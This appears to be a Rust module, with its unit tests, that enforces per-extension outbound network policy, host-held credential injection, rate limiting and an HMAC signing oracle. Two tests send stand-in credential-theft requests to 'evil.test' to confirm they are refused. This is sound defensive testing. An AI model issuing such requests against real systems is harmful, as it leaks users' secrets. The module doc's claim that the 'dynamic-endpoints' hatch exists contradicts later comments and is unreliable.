// SPDX-License-Identifier: AGPL-3.0-or-later
//! Per-extension outbound policy enforcement (RFC-0049; Sprint 03 Phase 1).
//!
//! This is the layer that turns an extension's *composed* request into one the
//! transport may perform — or refuses it. It sits between the confined guest
//! and [`kotton_sys::outbound::NetMediator`], and it is where
//! RFC-0049's two decided rules are actually enforced:
//!
//! - **Declared and binding by default.** A request whose destination is not
//!   covered by the author's declared endpoint patterns is refused. The
//!   `dynamic-endpoints` escape hatch exists, is surfaced at consent, and
//!   costs the extension credential injection.
//! - **Credentials are host-held.** The extension writes a
//!   [`CredentialRef`] placeholder; this layer resolves it from the
//!   [`SecretsStore`] and substitutes the real value *after* the destination
//!   passes. The secret never exists in guest memory, and never travels to a
//!   destination the user did not consent to.
//!
//! Also here: a per-extension **request rate cap**, so a hostile or looping
//! extension cannot flood a provider (or the user's uplink) — the network
//! sibling of the engine resource limits from Phase 0.
//!
//! The keyed-crypto oracle ([`ExtensionNetPolicy::credential_hmac`]) is how
//! derived-signature schemes (AWS SigV4 and kin) work without the secret
//! crossing the boundary: the extension asks the host to HMAC a string it
//! composed, the host keys that HMAC with the credential, and the extension
//! gets back only the digest. The provider-specific recipe stays in the
//! extension — no AWS knowledge enters the core.

use std::collections::VecDeque;
use std::sync::Arc;
use std::time::{Duration, Instant};

use kotton_sys::outbound::{
    DestinationPolicy, HeaderValue, NetError, NetMediator, NetResult, OutboundRequest,
    OutboundResponse,
};
use kotton_sys::secret::SecretsStore;
use tokio::sync::Mutex;

/// Default ceiling on mediated requests per extension per minute.
const DEFAULT_RATE_LIMIT_PER_MIN: usize = 120;

const RATE_WINDOW: Duration = Duration::from_secs(60);

/// HMAC-SHA256 output length, the oracle's digest size.
const HMAC_SHA256_LEN: usize = 32;

/// Everything the host knows about one installed extension's network posture.
///
/// Constructed from the extension's manifest + the user's configuration at
/// activation time, then consulted on every request the extension makes.
pub struct ExtensionNetPolicy {
    extension_id: String,
    policy: DestinationPolicy,
    mediator: Arc<dyn NetMediator>,
    secrets: Arc<dyn SecretsStore>,
    rate_limit_per_min: usize,
    recent: Mutex<VecDeque<Instant>>,
}

impl ExtensionNetPolicy {
    pub fn new(
        extension_id: impl Into<String>,
        policy: DestinationPolicy,
        mediator: Arc<dyn NetMediator>,
        secrets: Arc<dyn SecretsStore>,
    ) -> Self {
        Self {
            extension_id: extension_id.into(),
            policy,
            mediator,
            secrets,
            rate_limit_per_min: DEFAULT_RATE_LIMIT_PER_MIN,
            recent: Mutex::new(VecDeque::new()),
        }
    }

    pub fn with_rate_limit(mut self, per_min: usize) -> Self {
        self.rate_limit_per_min = per_min;
        self
    }

    pub fn extension_id(&self) -> &str {
        &self.extension_id
    }

    /// The secrets key for one of this extension's credential slots.
    ///
    /// Namespaced per extension so one extension can never name another's
    /// slot — the slot name comes from the guest, so it is untrusted input.
    fn secret_key(&self, slot: &str) -> String {
        kotton_sys::secret::prefix_key(&format!(
            "extension/{}/credential/{}",
            self.extension_id, slot
        ))
    }

    fn lookup_secret(&self, slot: &str) -> NetResult<String> {
        self.secrets
            .get_secret(&self.secret_key(slot))
            .map_err(|e| NetError::Transport(format!("secrets: {e}")))?
            .ok_or_else(|| NetError::CredentialMissing(slot.to_string()))
    }

    /// Extract the lowercased host from a URL, or refuse.
    fn host_of(url: &str) -> NetResult<String> {
        let parsed =
            url::Url::parse(url).map_err(|e| NetError::Malformed(format!("bad URL: {e}")))?;
        parsed
            .host_str()
            .map(|h| h.to_ascii_lowercase())
            .ok_or_else(|| NetError::Malformed("URL has no host".into()))
    }

    async fn check_rate(&self) -> NetResult<()> {
        let now = Instant::now();
        let mut recent = self.recent.lock().await;
        while recent.front().is_some_and(|t| now.duration_since(*t) > RATE_WINDOW) {
            recent.pop_front();
        }
        if recent.len() >= self.rate_limit_per_min {
            return Err(NetError::RateLimited);
        }
        recent.push_back(now);
        Ok(())
    }

    /// Authorize, resolve credentials, and perform an extension's request.
    ///
    /// Order is the security property: the destination is checked **before**
    /// any secret is resolved, so a request to an undeclared host never sees
    /// credential material — not even transiently in host memory.
    pub async fn request(&self, request: OutboundRequest) -> NetResult<OutboundResponse> {
        let host = Self::host_of(&request.url)?;
        if !self.policy.allows_host(&host) {
            tracing::warn!(
                extension = %self.extension_id,
                %host,
                "refused: destination is not in the extension's declared endpoints"
            );
            return Err(NetError::DestinationRefused(format!(
                "`{host}` is not among the endpoints `{}` declared",
                self.extension_id
            )));
        }
        self.check_rate().await?;

        // Credentials need no separate policy gate: they are resolved only
        // after the destination check above passed, and every permitted
        // destination is one the author declared and the user consented to.
        // (An earlier design needed a gate here because `dynamic-endpoints`
        // could permit arbitrary hosts; that escape hatch no longer exists.)
        let mut resolved = request;
        for (_, value) in resolved.headers.iter_mut() {
            if let HeaderValue::Credential(c) = value {
                let secret = self.lookup_secret(&c.slot)?;
                *value = HeaderValue::Literal(c.render(&secret));
            }
        }

        tracing::debug!(extension = %self.extension_id, %host, "mediating extension request");
        self.mediator.perform(resolved).await
    }

    /// Keyed-crypto oracle: HMAC-SHA256 `data` under the credential in `slot`.
    ///
    /// This is what lets an extension implement a derived-signature scheme
    /// (SigV4's chained HMACs, an HMAC request signature) while the raw secret
    /// stays host-side. The extension composes the string to sign — the
    /// provider-specific part, which belongs in the extension — and receives
    /// only the digest.
    pub fn credential_hmac(&self, slot: &str, data: &[u8]) -> NetResult<[u8; HMAC_SHA256_LEN]> {
        let secret = self.lookup_secret(slot)?;
        Ok(hmac_sha256(secret.as_bytes(), data))
    }

    /// Chained-HMAC form: each step keys the next, which is exactly the shape
    /// SigV4 derives a signing key with (`HMAC(HMAC(HMAC(k, date), region), …)`).
    /// One host call instead of four round trips, and the intermediate keys
    /// never cross the boundary either.
    pub fn credential_hmac_chain(
        &self,
        slot: &str,
        steps: &[Vec<u8>],
    ) -> NetResult<[u8; HMAC_SHA256_LEN]> {
        let secret = self.lookup_secret(slot)?;
        let mut key = secret.into_bytes();
        let mut digest = [0u8; HMAC_SHA256_LEN];
        for step in steps {
            digest = hmac_sha256(&key, step);
            key = digest.to_vec();
        }
        Ok(digest)
    }
}

/// HMAC-SHA256 — the ring-backed primitive from the crypto provider. Crypto is
/// never hand-rolled here; this alias just keeps the call sites readable.
use kotton_crypto::hmac_sha256_var as hmac_sha256;

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use async_trait::async_trait;
    use kotton_sys::outbound::{CredentialRef, EndpointPattern, HeaderText};
    use kotton_sys::secret::{SecretsResult, SecretsStore};
    use std::sync::Mutex as StdMutex;

    /// Records what actually reached the transport, so tests can assert on the
    /// *resolved* request — the only place credential substitution is visible.
    #[derive(Default)]
    struct RecordingMediator {
        seen: StdMutex<Vec<OutboundRequest>>,
    }

    #[async_trait]
    impl NetMediator for RecordingMediator {
        async fn perform(&self, request: OutboundRequest) -> NetResult<OutboundResponse> {
            self.seen.lock().unwrap().push(request);
            Ok(OutboundResponse {
                status: 200,
                headers: vec![],
                body: b"ok".to_vec(),
            })
        }
    }

    struct FakeSecrets(Vec<(String, String)>);

    impl SecretsStore for FakeSecrets {
        fn get_secret(&self, key: &str) -> SecretsResult<Option<String>> {
            Ok(self
                .0
                .iter()
                .find(|(k, _)| k == key)
                .map(|(_, v)| v.clone()))
        }
        fn set_secret(&self, _key: &str, _value: &str) -> SecretsResult<()> {
            Ok(())
        }
        fn delete_secret(&self, _key: &str) -> SecretsResult<()> {
            Ok(())
        }
    }

    fn policy_with(
        patterns: &[&str],
        secrets: Vec<(String, String)>,
    ) -> (ExtensionNetPolicy, Arc<RecordingMediator>) {
        let mediator = Arc::new(RecordingMediator::default());
        let policy = ExtensionNetPolicy::new(
            "sh.kotton.test-backend",
            DestinationPolicy::declared(
                patterns
                    .iter()
                    .map(|p| EndpointPattern::parse(p).unwrap())
                    .collect(),
            ),
            mediator.clone(),
            Arc::new(FakeSecrets(secrets)),
        );
        (policy, mediator)
    }

    fn req(url: &str) -> OutboundRequest {
        OutboundRequest {
            method: "GET".into(),
            url: url.into(),
            headers: vec![],
            body: vec![],
        }
    }

    fn req_with_credential(url: &str, slot: &str) -> OutboundRequest {
        let mut r = req(url);
        r.headers.push((
            "authorization".into(),
            HeaderValue::Credential(CredentialRef::new(slot, "Bearer {}")),
        ));
        r
    }

    #[tokio::test]
    async fn a_declared_destination_is_allowed_through() {
        let (policy, mediator) = policy_with(&["*.amazonaws.com"], vec![]);
        let resp = policy
            .request(req("https://s3.us-east-1.amazonaws.com/bucket/key"))
            .await
            .expect("declared host must pass");
        assert_eq!(resp.status, 200);
        assert_eq!(mediator.seen.lock().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn an_undeclared_destination_never_reaches_the_transport() {
        let (policy, mediator) = policy_with(&["*.amazonaws.com"], vec![]);
        let err = policy
            .request(req("https://evil.test/collect"))
            .await
            .expect_err("undeclared host must be refused");
        assert!(matches!(err, NetError::DestinationRefused(_)), "got: {err}");
        assert!(
            mediator.seen.lock().unwrap().is_empty(),
            "a refused request must not reach the transport at all"
        );
    }

    #[tokio::test]
    async fn a_credential_is_injected_only_for_the_declared_destination() {
        let key = kotton_sys::secret::prefix_key(
            "extension/sh.kotton.test-backend/credential/s3-key",
        );
        let (policy, mediator) = policy_with(
            &["*.amazonaws.com"],
            vec![(key, "SUPER-SECRET".to_string())],
        );

        policy
            .request(req_with_credential(
                "https://s3.amazonaws.com/b/k",
                "s3-key",
            ))
            .await
            .expect("declared host with credential");

        let seen = mediator.seen.lock().unwrap();
        let (_, value) = seen[0]
            .headers
            .iter()
            .find(|(n, _)| n == "authorization")
            .expect("authorization header present");
        assert_eq!(
            value,
            &HeaderValue::Literal(HeaderText::new("Bearer SUPER-SECRET")),
            "the host must substitute the real secret before the transport"
        );
    }

    #[tokio::test]
    async fn a_credential_is_never_resolved_for_an_undeclared_destination() {
        let key = kotton_sys::secret::prefix_key(
            "extension/sh.kotton.test-backend/credential/s3-key",
        );
        let (policy, mediator) =
            policy_with(&["*.amazonaws.com"], vec![(key, "SUPER-SECRET".to_string())]);

        let err = policy
            .request(req_with_credential("https://evil.test/steal", "s3-key"))
            .await
            .expect_err("must refuse");
        assert!(matches!(err, NetError::DestinationRefused(_)), "got: {err}");
        assert!(
            mediator.seen.lock().unwrap().is_empty(),
            "the secret must never leave the host toward an undeclared destination"
        );
    }

    /// There is no policy that permits an arbitrary host, so an extension that
    /// declared no network reaches nothing. Absence is refusal, never
    /// permission — the property that replaced the old `dynamic-endpoints`
    /// escape hatch.
    #[tokio::test]
    async fn an_extension_that_declared_no_network_reaches_nothing() {
        let mediator = Arc::new(RecordingMediator::default());
        let policy = ExtensionNetPolicy::new(
            "sh.kotton.quiet",
            DestinationPolicy::none(),
            mediator.clone(),
            Arc::new(FakeSecrets(vec![])),
        );

        for url in [
            "https://anything.test/feed.xml",
            "https://example.com/",
            "https://s3.amazonaws.com/b/k",
        ] {
            let err = policy.request(req(url)).await.expect_err("must be refused");
            assert!(matches!(err, NetError::DestinationRefused(_)), "got: {err}");
        }
        assert!(
            mediator.seen.lock().unwrap().is_empty(),
            "nothing may reach the transport"
        );
    }

    #[tokio::test]
    async fn a_missing_credential_slot_is_a_clean_error() {
        let (policy, _) = policy_with(&["example.com"], vec![]);
        let err = policy
            .request(req_with_credential("https://example.com/", "absent"))
            .await
            .expect_err("must error");
        assert!(matches!(err, NetError::CredentialMissing(ref s) if s == "absent"));
    }

    #[tokio::test]
    async fn a_flooding_extension_is_rate_limited() {
        let (policy, _) = policy_with(&["example.com"], vec![]);
        let policy = policy.with_rate_limit(3);
        for i in 0..3 {
            policy
                .request(req("https://example.com/"))
                .await
                .unwrap_or_else(|e| panic!("request {i} must pass: {e}"));
        }
        let err = policy
            .request(req("https://example.com/"))
            .await
            .expect_err("past the cap");
        assert!(matches!(err, NetError::RateLimited));
    }

    /// RFC 4231 test case 2 — proves the oracle is real HMAC-SHA256, so an
    /// extension's SigV4 implementation will interoperate with AWS.
    #[test]
    fn the_credential_oracle_computes_standard_hmac_sha256() {
        let digest = hmac_sha256(b"Jefe", b"what do ya want for nothing?");
        assert_eq!(
            digest.to_vec(),
            hex_to_bytes("5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843"),
        );
    }

    #[test]
    fn the_oracle_chains_keys_the_way_sigv4_derives_a_signing_key() {
        let key = kotton_sys::secret::prefix_key(
            "extension/sh.kotton.test-backend/credential/s3-key",
        );
        let (policy, _) = policy_with(&["*.amazonaws.com"], vec![(key, "AWS4secret".into())]);

        let steps = vec![
            b"20260801".to_vec(),
            b"us-east-1".to_vec(),
            b"s3".to_vec(),
            b"aws4_request".to_vec(),
        ];
        let chained = policy.credential_hmac_chain("s3-key", &steps).unwrap();

        // Same derivation done by hand: each digest keys the next step.
        let mut expected = hmac_sha256(b"AWS4secret", &steps[0]);
        for step in &steps[1..] {
            expected = hmac_sha256(&expected, step);
        }
        assert_eq!(chained, expected);
        assert_ne!(chained, [0u8; 32]);
    }

    fn hex_to_bytes(hex: &str) -> Vec<u8> {
        (0..hex.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).unwrap())
            .collect()
    }
}
